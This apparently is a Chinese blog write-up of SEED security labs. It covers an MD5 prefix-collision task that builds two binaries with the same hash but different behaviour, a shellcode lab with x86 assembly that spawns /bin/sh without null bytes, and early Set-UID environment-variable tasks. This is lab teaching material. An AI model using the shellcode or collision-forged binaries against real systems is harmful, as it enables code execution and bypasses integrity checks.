<h2 id="Task-4-Making-the-Two-Programs-Behave-Differently"><a href="#Task-4-Making-the-Two-Programs-Behave-Differently" class="headerlink" title="Task 4: Making the Two Programs Behave Differently"></a>Task 4: Making the Two Programs Behave Differently</h2><p>首先编写一个代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925232043446.png" alt="image-20230925232043446"></p>
<p>这个就是一个好的代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925232107428.png" alt="image-20230925232107428"></p>
<p>之后通过bless查看其对应的二进制：找到A B数组对应的地方，可以看到是从12320开始的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925232206718.png" alt="image-20230925232206718"></p>
<p>取64（0x40）的倍数0x3040。十进制12352，生成两个前缀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head -c 12352 code &gt; prefix</span><br><span class="line">md5collgen -p prefix -o p q</span><br></pre></td></tr></table></figure>

<p>查看发现在0x31c8处开始后面内容，在此截取后部分内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -c +12745 code &gt; suffix</span><br></pre></td></tr></table></figure>

<p>把其中一个新前缀p的后32(字符A)+128(md5填充物)&#x3D;16032(字符A)+128(MD5填充物)&#x3D;160个字节截取出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -c 160 p &gt; middle</span><br></pre></td></tr></table></figure>

<p>数组的长度是200，200−160&#x3D;40200−160&#x3D;40，所以还需要填充40个字节给a和b数组，</p>
<p>两个数组相差0x3100−0x3020&#x3D;0xE0&#x3D;224字节，不是200字节，因此需要在a数组和b数组之间插入24个<code>0x00</code>：</p>
<p>使用python生成40个字符串，由于python生成时会在末尾自动加上<code>0A</code>，因此我们需要截取生成的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;print(&#x27;\x00&#x27;*40)&quot; &gt; tmp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head -c 40 tmp &gt; m40</span><br><span class="line">head -c 24 tmp &gt; m24</span><br></pre></td></tr></table></figure>

<p>开始拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat p m40 m24 middle m40 suffix &gt; s</span><br><span class="line">cat q m40 m24 middle m40 suffix &gt; k</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925232638244.png" alt="image-20230925232638244"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20230925232655109.png" alt="image-20230925232655109"></p>
<h1 id="Shellcode-Development-Lab"><a href="#Shellcode-Development-Lab" class="headerlink" title="Shellcode Development Lab"></a>Shellcode Development Lab</h1><h2 id="Task-1-a-The-Entire-Process"><a href="#Task-1-a-The-Entire-Process" class="headerlink" title="Task 1.a: The Entire Process"></a>Task 1.a: The Entire Process</h2><h3 id="Compiling-to-object-code"><a href="#Compiling-to-object-code" class="headerlink" title="Compiling to object code."></a>Compiling to object code.</h3><p>将汇编语言编译成为机器码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160052204.png" alt="image-20231023160052204"></p>
<h3 id="Linking-to-generate-final-binary"><a href="#Linking-to-generate-final-binary" class="headerlink" title="Linking to generate final binary."></a>Linking to generate final binary.</h3><p>将编译后的文件进行链接，就生成了可执行文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160232950.png" alt="image-20231023160232950"></p>
<p>运行之后可以看到是子进程运行的shell命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160355881.png" alt="image-20231023160355881"></p>
<h3 id="Getting-the-machine-code"><a href="#Getting-the-machine-code" class="headerlink" title="Getting the machine code"></a>Getting the machine code</h3><p>可以通过<code>objdump -Mintel --disassemble mysh.o</code>查看编译之后机器码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160537136.png" alt="image-20231023160537136"></p>
<p>也可以通过<code> xxd -p -c 20 mysh.o</code>查看没有被高亮的机器码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160613800.png" alt="image-20231023160613800"></p>
<h3 id="Using-the-shellcode-in-attacking-code"><a href="#Using-the-shellcode-in-attacking-code" class="headerlink" title="Using the shellcode in attacking code."></a>Using the shellcode in attacking code.</h3><p>可以使用<code>convert.py</code>将机器码转换一个格式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160924699.png" alt="image-20231023160924699"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023160938185.png" alt="image-20231023160938185"></p>
<h2 id="Task-1-b-Eliminating-Zeros-from-the-Code"><a href="#Task-1-b-Eliminating-Zeros-from-the-Code" class="headerlink" title="Task 1.b. Eliminating Zeros from the Code"></a>Task 1.b. Eliminating Zeros from the Code</h2><p>先看看<code>/</code>的指令是:<code>2f</code>，然后68当作结尾符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231016163304175.png" alt="image-20231016163304175"></p>
<p>由于不能使用<code>\</code>，就使用<code>***</code>将h填满到4个字节，因为是小端存储所以需要先左移，再右移的方式将<code>***</code>消除掉。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231016165603858.png" alt="image-20231016165603858"></p>
<p>查看反汇编指令：并没有00</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231016165728013.png" alt="image-20231016165728013"></p>
<p>成功运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231016165749981.png" alt="image-20231016165749981"></p>
<h2 id="Task-1-c-Providing-Arguments-for-System-Calls"><a href="#Task-1-c-Providing-Arguments-for-System-Calls" class="headerlink" title="Task 1.c. Providing Arguments for System Calls"></a>Task 1.c. Providing Arguments for System Calls</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor eax,eax</span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      </span><br><span class="line">      push &quot;//sh&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax</span><br><span class="line">      mov eax, &quot;##-c&quot;</span><br><span class="line">      shr eax,16</span><br><span class="line">      push eax</span><br><span class="line">      xor eax, eax</span><br><span class="line">      mov ecx, esp</span><br><span class="line"></span><br><span class="line">      mov eax,&quot;##la&quot;</span><br><span class="line">      shr eax,16</span><br><span class="line">      push eax</span><br><span class="line">      xor eax,eax</span><br><span class="line">      push &quot;ls -&quot;</span><br><span class="line">      mov edx, esp</span><br><span class="line">      </span><br><span class="line">      xor eax,eax</span><br><span class="line"></span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push edx          ; argv[0] points &quot;/bin//sh&quot;</span><br><span class="line">      push ecx</span><br><span class="line">      push ebx</span><br><span class="line"></span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure>

<p>我们一行一行进行解释:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure>

<p>这一行先使用异或，将eax清零，然后将eax压入栈，用于字符串终止标志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov  ebx, esp</span><br></pre></td></tr></table></figure>

<p>将两个字符串压入栈中，因为寄存器是32位，所以都是正好可以压入的，不用另外处理，然后把这个字符串，即<code>/bin/sh</code>的地址赋值给<code>ebx</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push eax</span><br><span class="line">mov eax, &quot;##-c&quot;</span><br><span class="line">shr eax,16</span><br><span class="line">push eax</span><br><span class="line">xor eax, eax</span><br><span class="line">mov ecx, esp</span><br></pre></td></tr></table></figure>

<p>将空的eax压入栈中，也是当作字符串的结尾使用。</p>
<p>接下来的两条指令都是为了将空格给创造出来</p>
<p>然后将字符串压入栈中，同时清空eax供之后直接使用</p>
<p>同时将字符串的地址赋值给esp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,&quot;##la&quot;</span><br><span class="line">shr eax,16</span><br><span class="line">push eax</span><br><span class="line">xor eax,eax</span><br><span class="line">push &quot;ls -&quot;</span><br><span class="line">mov edx, esp</span><br></pre></td></tr></table></figure>

<p>也是同样的将<code>  la</code>指令创造出来压入栈中，同时把<code>ls -</code>指令压入栈中，这样的字符串就是<code>ls -la</code>，然后将字符串地址赋值给edx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push eax          ; argv[1] = 0</span><br><span class="line">push edx          </span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br></pre></td></tr></table></figure>

<p>这些寄存器都存储好了字符串的地址，之后将这些寄存器按照参数先后顺序压入栈中就完成了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231017214828641.png" alt="image-20231017214828641"></p>
<h2 id="Task-1-d-Providing-Environment-Variables-for-execve"><a href="#Task-1-d-Providing-Environment-Variables-for-execve" class="headerlink" title="Task 1.d. Providing Environment Variables for execve()"></a>Task 1.d. Providing Environment Variables for execve()</h2><p>对于每个字符串，都像前一个实验那样，将字符串压入栈中，并且存储对应字符串的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231017222332309.png" alt="image-20231017222332309"></p>
<p>按照文档顺序都压入栈中，但是最后一个压入的一定是edx，如果选用其他的寄存器会导致段错误</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231017222508497.png" alt="image-20231017222508497"></p>
<p>编译执行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231017222635210.png" alt="image-20231017222635210"></p>
<h2 id="Task-2-Using-Code-Segment"><a href="#Task-2-Using-Code-Segment" class="headerlink" title="Task 2: Using Code Segment"></a>Task 2: Using Code Segment</h2><h3 id="Task1-1"><a href="#Task1-1" class="headerlink" title="Task1"></a>Task1</h3><p><code>one:</code>: 定义一个标签 <code>one</code>。</p>
<p><code>pop ebx</code>: 弹出堆栈顶部的值，将其存储到EBX寄存器中，这个值是标签 <code>two</code> 后面的字符串的地址。</p>
<p><code>xor eax, eax</code>: 将EAX寄存器的值清零，通常用于清零寄存器中的临时数据。</p>
<p><code>mov [ebx+7], al</code>: 将EAX中的0写入到EBX加7的地址处，这是为了将字符串 “&#x2F;bin&#x2F;sh” 的结尾标志设置为null终止符。</p>
<p><code>mov [ebx+8], ebx</code>: 将EBX的值写入到EBX加8的地址处，实际上是将 “&#x2F;bin&#x2F;sh” 的地址存储在这个位置。</p>
<p><code>mov [ebx+12], eax</code>: 将0写入到EBX加12的地址处，用于argv[2]，表示命令参数列表的结束。</p>
<p><code>lea ecx, [ebx+8]</code>: 计算 <code>[ebx+8]</code> 的地址，将结果存储在ECX中，这将成为<code>execve</code>系统调用的第二个参数，即参数数组 <code>argv</code> 的地址。</p>
<p><code>xor edx, edx</code>: 将EDX寄存器的值清零，通常用于清零寄存器中的临时数据。</p>
<p><code>mov al, 0x0b</code>: 将AL寄存器设置为0x0b，这是<code>execve</code>系统调用的系统调用号。</p>
<p><code>int 0x80</code>: 触发中断0x80，从而调用<code>execve</code>系统调用，以执行 <code>/bin/sh</code>。</p>
<p><code>two:</code>: 定义标签 <code>two</code>。</p>
<p><code>call one</code>: 调用标签 <code>one</code>，实际上执行了前面定义的 <code>one</code> 子例程。</p>
<p><code>db &#39;/bin/sh*AAAABBBB&#39;</code>: 定义一个字符串，其中包含要执行的命令 <code>/bin/sh</code>，以及一些填充字符。这个字符串是 <code>pop ebx</code> 命令后面的内容，它将被用来设置EBX寄存器，以便执行 <code>/bin/sh</code> 命令。</p>
<p>通过修改内存中的字符串和寄存器来构造 <code>execve</code> 系统调用所需的参数，然后触发系统调用来执行指定的命令，从而成功执行 <code>/bin/sh</code> 程序。</p>
<p>他是将定义好的字符串，即’&#x2F;bin&#x2F;sh*AAAABBBB’，在one中弹出并且存储到ebx中，同时将其之下的位置当作参数位置进行构造，然后记录其起始位置，通过中断并且调用execve函数进行&#x2F;bin&#x2F;sh的执行</p>
<h3 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h3><ul>
<li><p>‘&#x2F;usr&#x2F;bin&#x2F;env#-i#a&#x3D;11#b&#x3D;22#AAAABBBBCCCCDDDDEEEE’是我们构造的字符串，通过call + pop指令可以获取该地址</p>
<ul>
<li><code>#</code>是占位符。为了防止0导致strcpy无法复制字符串，这里使用#作为占位符，后面会用al进行替换</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env -i a=11 b=22</span><br></pre></td></tr></table></figure>

<p>是我们要执行的命令（一定要注意到字符串最后有个\0）</p>
<ul>
<li>ecx存储argv的地址，因此指向ebx+26</li>
<li>ebx存储“&#x2F;usr&#x2F;bin&#x2F;env\0”的地址</li>
</ul>
</li>
</ul>
<p>运行结果为：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023165212011.png" alt="image-20231023165212011"></p>
<h3 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h3><p>注意到64位和32位的不同：</p>
<ul>
<li>64位系统，调用系统调用是通过 syscall 指令完成的</li>
<li>系统调用的前三个参数分别存储在 rdx、 rsi 和 rdi 寄存器中</li>
</ul>
<p>修改之后的文件为：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023165357052.png" alt="image-20231023165357052"></p>
<p>成功执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023165500580.png" alt="image-20231023165500580"></p>
<h1 id="Environment-Variable-and-Set-UID-Program-Lab"><a href="#Environment-Variable-and-Set-UID-Program-Lab" class="headerlink" title="Environment Variable and Set-UID Program Lab"></a>Environment Variable and Set-UID Program Lab</h1><h2 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h2><p>使用<code>printenv</code>或者<code>env</code>打印环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023173945650.png" alt="image-20231023173945650"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023173955477.png" alt="image-20231023173955477"></p>
<p>使用<code>env | grep PWD</code>或者 printenv PWD 查看特定的环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174106529.png" alt="image-20231023174106529"></p>
<p>使用<code>export</code>命令添加环境变量，使用<code>unset</code>删除环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174217076.png" alt="image-20231023174217076"></p>
<h2 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h2><p><code>myprintenv.c</code>比较简单</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174550859.png" alt="image-20231023174550859"></p>
<h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>编译文件，并且将输出重定向到file文件中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174415051.png" alt="image-20231023174415051"></p>
<h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><p>将父进程的环境变量打印，并输出到另一个文件<code>file2</code>中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174728509.png" alt="image-20231023174728509"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174742360.png" alt="image-20231023174742360"></p>
<h3 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h3><p>比较两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023174824472.png" alt="image-20231023174824472"></p>
<p>并没有输出，说明两个文件没有差异，即子进程完全继承了父进程的环境变量</p>
<h2 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and execve()</h2><p>在文档的描述中说到，<code>execve()</code>并不会返回，其运行的进程直接使用调用<code>execve()</code>的进程的地址空间，而且是覆盖了原来进程的地址空间。</p>
<p>提出一个问题新的进程是否自动继承了调用进程的环境变量?</p>
<h3 id="Step1-1"><a href="#Step1-1" class="headerlink" title="Step1"></a>Step1</h3><p>编译<code>myenv.c</code>文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023175233449.png" alt="image-20231023175233449"></p>
<p>运行它，发现并没有输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023175324768.png" alt="image-20231023175324768"></p>
<h3 id="Step2-1"><a href="#Step2-1" class="headerlink" title="Step2"></a>Step2</h3><p>更改第十二行代码，编译运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023175410360.png" alt="image-20231023175410360"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023175432534.png" alt="image-20231023175432534"></p>
<p>发现打印出了环境变量</p>
<h3 id="Step3-1"><a href="#Step3-1" class="headerlink" title="Step3"></a>Step3</h3><p>发现在原来的程序中定义了一个外部变量<code>environ</code>，并且在调用exevce时，传入了这个值，他就是父进程中的环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023175754689.png" alt="image-20231023175754689"></p>
<p>在man中也有说明</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023175941334.png" alt="image-20231023175941334"></p>
<h2 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and system()</h2><p>不同于<code>execve()</code>, <code>system()</code>系统调用使用的其实是<code>/bin/bash</code>运行指定的命令</p>
<p>编写代码，并且运行，发现它打印出了环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023180437677.png" alt="image-20231023180437677"></p>
